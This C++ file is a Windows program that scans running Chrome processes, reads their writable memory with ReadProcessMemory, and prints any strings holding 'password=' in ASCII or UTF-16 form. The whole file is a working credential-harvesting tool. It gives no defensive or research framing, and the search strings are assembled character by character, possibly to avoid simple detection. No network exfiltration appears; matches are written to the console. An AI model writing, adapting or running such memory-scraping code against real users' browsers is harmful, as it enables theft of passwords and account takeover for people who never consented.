
#include <windows.h>
#include <iostream>
#include <vector>
#include <TlHelp32.h>
#include <algorithm>

auto main(void) -> __int32 //c++ 20, 64x, multibyte, MT
{
    for (auto snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); snap != INVALID_HANDLE_VALUE; Sleep(1))
    {
        tagPROCESSENTRY32 entry
        {
            sizeof(tagPROCESSENTRY32)
        };

        for (auto init = Process32First(snap, &entry); init && Process32Next(snap, &entry); Sleep(1))
        {
            if (std::string(entry.szExeFile).find("chrome.exe") == std::string::npos)
                continue;
            
            auto handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);

            if (handle == nullptr)
                continue;

            _MEMORY_BASIC_INFORMATION mbi;

            for (unsigned __int64 address = 0; VirtualQueryEx(handle, (void*)address, &mbi, sizeof(mbi)); address += mbi.RegionSize)
            {
                if (address != 0 &&
                    mbi.Protect != PAGE_NOACCESS && mbi.Protect != PAGE_GUARD && mbi.Protect & PAGE_READWRITE && mbi.State == MEM_COMMIT)
                {
                    std::string memory(mbi.RegionSize, 0);

                    unsigned __int64 bytes_read = 0;

                    ReadProcessMemory(handle, (void*)address, &memory[0], mbi.RegionSize, &bytes_read);

                    if (bytes_read == 0)
                        continue;

                    memory.resize(bytes_read);

                    static auto get_full_string = [&](__int8 type, unsigned __int64 pos) -> std::string
                    {
                        auto min = pos;
                        auto max = pos;

                        for (; min > (type == 0 ? 0 : 1); --min)
                        {
                            if (memory[min] == 0 && (type == 0 ? true : memory[min - 1] == 0))
                            {
                                ++min;
                                break;
                            }
                        }

                        for (; max < (type == 0 ? bytes_read : bytes_read - 1); ++max)
                        {
                            if (memory[max] == 0 && (type == 0 ? true : memory[max + 1] == 0))
                            {
                                --max;
                                break;
                            }
                        }

                        return std::string(&memory[min], max - min + 1 /*can be multibyte & unicode*/);
                    };

                    static const std::string pass
                    { 'p', 'a', 's', 's', 'w', 'o', 'r', 'd', '=' };

                    static const std::string wide
                    { 'p', 0, 'a', 0, 's', 0, 's', 0, 'w', 0, 'o', 0, 'r', 0, 'd', 0, '=', 0 };

                    static std::vector<std::string> results;

                    for (auto pos = memory.find(pass); pos != std::string::npos; pos = memory.find(pass, pos + 1))
                    {
                        auto str = get_full_string(0, pos);

                        if (str.length() > 0x400)
                            continue;

                        if (std::find(results.begin(), results.end(), str) == results.end())
                        {
                            results.push_back(str);

                            std::cout << str << std::endl << "---------------" << std::endl;
                        }
                    }

                    for (auto pos = memory.find(wide); pos != std::string::npos; pos = memory.find(wide, pos + 1))
                    {
                        auto str = get_full_string(1, pos);

                        if (str.length() > 0x400)
                            continue;

                        if (std::find(results.begin(), results.end(), str) == results.end())
                        {
                            results.push_back(str);

                            std::cout << str << std::endl << "---------------" << std::endl;
                        }
                    }
                }
            }

            CloseHandle(handle);
        }
    }

	return EXIT_SUCCESS;
}